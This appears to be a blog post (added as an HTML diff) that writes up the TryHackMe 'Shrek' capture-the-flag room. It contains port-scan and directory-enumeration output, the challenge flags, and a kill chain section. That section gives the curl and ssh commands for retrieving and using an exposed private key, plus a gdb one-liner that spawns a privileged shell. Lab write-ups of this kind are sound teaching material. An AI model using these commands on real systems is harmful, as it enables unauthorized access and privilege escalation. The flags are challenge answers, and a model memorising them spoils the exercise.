@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>0x64azana</title>
+  <link rel="stylesheet" href="../../../style.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet" />
+</head>
+<body>
+  <header class="site-header">
+    <div class="header-left">
+      <h1 class="site-title"><a href="../../../about.html">0x64azana</a></h1>
+    </div>
+    <nav class="header-nav">
+      <ul class="nav-menu">
+        <li><a href="../../../index.html">Home</a></li>
+        <li><a href="../index.html" class="active">Insights</a></li>
+        <li><a href="../../projects/index.html">Projects</a></li>
+        <li><a href="../../../services.html">Services</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main>
+    <section class="projects-section">
+      <h2>Write up</h2>
+
+      <article class="post-item">
+        <h3 style="margin-top: 0;">Name</h3>
+        <p>TryHackMe | Shrek</p>
+
+        <h3>Writer</h3>
+        <p style="margin-bottom: 16px;">0x64azana</p>
+        <h3>Genre</h3>
+        <p style="margin-bottom: 24px;">Enumeration, Exploitation, Priv-Esc</p>
+
+        <p style="margin-bottom: 16px;">
+<h3 style="margin-top:16px;">OS</h3> CentOS 3.10.0-862.el7.x86_64<br>
+<h3 style="margin-top:16px;">IP</h3> 10.10.148.27<br>
+<h3 style="margin-top:16px;">HOSTNAME</h3> shrek<br>
+<h3 style="margin-top:16px;">BASIC-INFO</h3> 1 Hour to find as many flags as you can! <br>
+<h3 style="margin-top:16px;">USERS / EMAILS</h3><br>
+shrek<br>
+<br>
+<h3 style="margin-top:16px;">CREDENTIALS</h3><br>
+??shrek is a winner??					## See 9. 10. 11.<br>
+shrek : id_rsa<br>
+<br>
+<br>==============================================================================<br>
+<h3 style="margin-top:16px;">NMAP-RESULTS</h3><br>
+init_<br>
+21/tcp   open  ftp<br>
+22/tcp   open  ssh<br>
+80/tcp   open  http<br>
+3306/tcp open  mysql<br>
+8009/tcp open  ajp13<br>
+8080/tcp open  http-proxy<br>
+9999/tcp open  abyss<br>
+<br>
+nmap_<br>
+Discovered open port 80/tcp on 10.10.148.27		Apache/2.4.6 (CentOS) PHP/7.1.33<br>
+Discovered open port 3306/tcp on 10.10.148.27<br>
+Discovered open port 22/tcp on 10.10.148.27		OpenSSH 7.4 (protocol 2.0)<br>
+Discovered open port 21/tcp on 10.10.148.27		vsftpd 3.0.2<br>
+Discovered open port 8080/tcp on 10.10.148.27		Apache Tomcat/7.0.88<br>
+Discovered open port 9999/tcp on 10.10.148.27<br>
+Discovered open port 65432/tcp on 10.10.148.27		False find<br>
+Discovered open port 8009/tcp on 10.10.148.27		Protocol v1.3<br>
+<br>
+<br>==============================================================================<br>
+<h3 style="margin-top:16px;">TO-TRY</h3><br>
+1. FTP ANON							-- Failed<br>
+2. Enum 80 (HTTP)						<br>
+3. Enum 8080 and 9999 (HTTP)<br>
+4. Review NMAP output						-> 5.<br>
+5. See /Cpxtpt2hWCee9VFa.txt					-- SUCCESSFUL -> 6.<br>
+6. Find the user the id_rsa belongs to.				-- 12.<br>
+7. Inspect gobuster output for port 80				-> 6.<br>
+8. Brute Force http://10.10.148.27:8080/manager/html<br>
+9. Base64 decode string found in port 80:/ comments		-> 10.<br>
+10. Find and decode the second layer of (9.)			-> 11.<br>
+11. Test the the output as a password				-- FAILED<br>
+12. Test id_rsa on shrek					-- SUCCESSFUL -> 13.<br>
+13. Enum Internals						-> 14.<br>
+14. Enum flags in the system					-> 15.<br>
+15. Find common privesc methods					-- SUCCESSFUL -> 16.<br>
+16. Enum all flags as root					-- SUCCESSFUL					<br>
+<br>
+<h3 style="margin-top:16px;">CVE-LIST</h3> N/A<br>
+<br>==============================================================================<br>
+<h3 style="margin-top:16px;">WEB-TECHS</h3><br>
+- PHP<br>
+- Apache Tomcat<br>
+<h3 style="margin-top:16px;">SUBDIR-ENUMS</h3> N/A<br>
+<h3 style="margin-top:16px;">DIR-ENUMERATIONS</h3><br>
+80_<br>
+/api                  (Status: 301) [Size: 232] [--> http://10.10.148.27/api/]<br>
+/cgi-bin/             (Status: 403) [Size: 210]<br>
+/cms                  (Status: 301) [Size: 232] [--> http://10.10.148.27/cms/]<br>
+/robots.txt           (Status: 200) [Size: 46]<br>
+/upload               (Status: 301) [Size: 235] [--> http://10.10.148.27/upload/]<br>
+8080_<br>
+/docs                 (Status: 302) [Size: 0] [--> /docs/]<br>
+/examples             (Status: 302) [Size: 0] [--> /examples/]<br>
+/favicon.ico          (Status: 200) [Size: 21630]<br>
+/manager              (Status: 302) [Size: 0] [--> /manager/]<br>
+/plain]               (Status: 400) [Size: 0]<br>
+/quote]               (Status: 400) [Size: 0]<br>
+<br>
+<br>==============================================================================<br>
+<h3 style="margin-top:16px;">TAKE-AWAYS</h3><br>
+1. This is a docker container, as shown by running ip route<br>
+<br>
+Flags_<br>
+shrek<br>
+0069ba233da89efe6f48e7d214034130<br>
+<br>
+Donkey<br>
+974acecd51cc45c843062fdac6235e97<br>
+<br>
+Puss<br>
+6f960e8f2ea8e3de92f192fae492ec59<br>
+<br>
+root<br>
+8cc6ece048e6c42251c411814ff5a22d<br>
+<br>
+etc<br>
+456ca96a9ba8a9f527089ddde0efc92d<br>
+<br>==============================================================================<br>
+<h3 style="margin-top:16px;">Issues</h3>  <br>
+/robots.txt exposes SSH private key for `shrek` user<br>
+<br>
+<h3 style="margin-top:16px;">Severity</h3>  <br>
+Critical<br>
+<br>
+<h3 style="margin-top:16px;">Compliance Gap</h3>  <br>
+Public exposure of sensitive credentials (CIS, NIST, PCI DSS)<br>
+<br>
+<h3 style="margin-top:16px;">Impact</h3>  <br>
+Attacker can log in via SSH as `shrek`, gaining a foothold and possibly escalating privileges.<br>
+<br>
+<h3 style="margin-top:16px;">Kill Chain</h3><br>
+1.<br>
+# Displays issue file<br>
+curl http://10.10.148.27/robots.txt<br>
+<br>
+2.<br>
+# Create the necessary file.<br>
+curl http://10.10.148.27/Cpxtpt2hWCee9VFa.txt > id_rsa && chmod 600 ./id_rsa<br>
+<br>
+3.<br>
+# Start a connection using the shrek user and the id_rsa file<br>
+ssh shrek@10.10.148.27 -i id_rsa<br>
+<br>
+4.<br>
+# Priv Esc<br>
+gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit<br>
+<br>
+<h3 style="margin-top:16px;">Remediations</h3><br>
+- Remove key from /robots.txt  <br>
+- Rotate `shrek` SSH key  <br>
+- Harden web & file permissions<br>
+<br>
+</p>
+    </section>
+  </main>
+
+  <footer>
+    <p><a href="https://x.com/0x64azana" target="_self">Twitter</a></p>
+  </footer>
+</body>
+</html>
+
